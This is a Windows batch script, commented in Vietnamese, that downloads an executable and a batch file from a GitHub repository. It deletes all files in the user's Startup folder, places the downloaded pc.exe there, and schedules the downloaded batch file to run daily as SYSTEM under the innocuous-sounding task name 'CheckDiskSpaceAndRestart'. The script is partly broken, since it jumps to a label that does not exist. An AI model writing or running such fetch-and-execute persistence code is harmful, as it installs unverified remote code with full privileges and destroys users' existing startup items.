@echo off
setlocal enabledelayedexpansion

:: Tạo file log
set "logFile=C:\Users\%USERNAME%\Desktop\anime\script_log.txt"
echo Starting script execution on %date% %time% >> "!logFile!"

:: Nhập URL của các tệp bạn muốn tải xuống từ GitHub
set "cleanUrl=https://raw.githubusercontent.com/quannqttg/emulators/main/clean.bat"
set "pcUrl=https://github.com/quannqttg/emulators/raw/main/pc.exe"

:: Lấy tên người dùng hiện tại từ biến môi trường USERNAME
set "userDir=%USERNAME%"
set "animeDir=C:\Users\%userDir%\Desktop\anime"
echo Checking for user directory: !userDir! >> "!logFile!"
echo Anime directory path: !animeDir! >> "!logFile!"

if exist "!animeDir!" (
    echo User directory "!userDir!" exists: "!animeDir!" >> "!logFile!"

    :: Tải xuống tệp clean.bat
    echo Downloading clean.bat to "!animeDir!"... >> "!logFile!"
    curl -L -o "!animeDir!\clean.bat" "!cleanUrl!"
    if errorlevel 1 (
        echo Failed to download clean.bat. Check the URL and your network connection. >> "!logFile!"
        goto :SkipToCopyPC
    )
    echo File downloaded successfully to "!animeDir!\clean.bat". >> "!logFile!"

    :: Tải xuống tệp pc.exe
    echo Downloading pc.exe to "!animeDir!"... >> "!logFile!"
    curl -L -o "!animeDir!\pc.exe" "!pcUrl!"
    if errorlevel 1 (
        echo Failed to download pc.exe. Check the URL and your network connection. >> "!logFile!"
        goto :SkipToNext
    )
    echo File downloaded successfully to "!animeDir!\pc.exe". >> "!logFile!"

    :: Xác định thư mục Startup
    set "startupDir=C:\Users\%userDir%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    echo Startup directory path: "!startupDir!" >> "!logFile!"

    :: Xóa tất cả các tệp trong thư mục Startup
    echo Deleting all files in the Startup directory... >> "!logFile!"
    del /q "!startupDir!\*.*" >nul 2>&1
    echo All files in Startup directory have been deleted. >> "!logFile!"

    :: Sao chép tệp pc.exe vào thư mục Startup
    echo Copying pc.exe to "!startupDir!"... >> "!logFile!"
    if not exist "!startupDir!" (
        echo Startup directory does not exist. Creating it... >> "!logFile!"
        mkdir "!startupDir!"
    )
    copy "!animeDir!\pc.exe" "!startupDir!\pc.exe" >nul
    if errorlevel 1 (
        echo Failed to copy pc.exe to Startup directory. >> "!logFile!"
        goto :SkipToNext
    )
    echo pc.exe copied successfully to "!startupDir!". >> "!logFile!"

    :: Kiểm tra xem tác vụ có tồn tại không
    schtasks /query /tn "CheckDiskSpaceAndRestart" >nul 2>&1
    if errorlevel 1 (
        echo No existing task named "CheckDiskSpaceAndRestart" found. >> "!logFile!"
    ) else (
        echo Deleting any existing task named "CheckDiskSpaceAndRestart"... >> "!logFile!"
        schtasks /delete /tn "CheckDiskSpaceAndRestart" /f
        echo SUCCESS: The scheduled task "CheckDiskSpaceAndRestart" was successfully deleted. >> "!logFile!"
    )

    :: Tạo tác vụ lên lịch
    echo Creating a new scheduled task... >> "!logFile!"
    schtasks /create /tn "CheckDiskSpaceAndRestart" /tr "!animeDir!\clean.bat" /sc daily /st 12:00 /ru "SYSTEM" /rl highest /f
    echo Scheduled task "CheckDiskSpaceAndRestart" has been created to run "!animeDir!\clean.bat" at 12:00 daily. >> "!logFile!"

) else (
    echo User directory "!userDir!" does not exist or Desktop\anime not found. Skipping to next user... >> "!logFile!"
)

:SkipToNext
echo Script execution completed on %date% %time% >> "!logFile!"
endlocal
pause
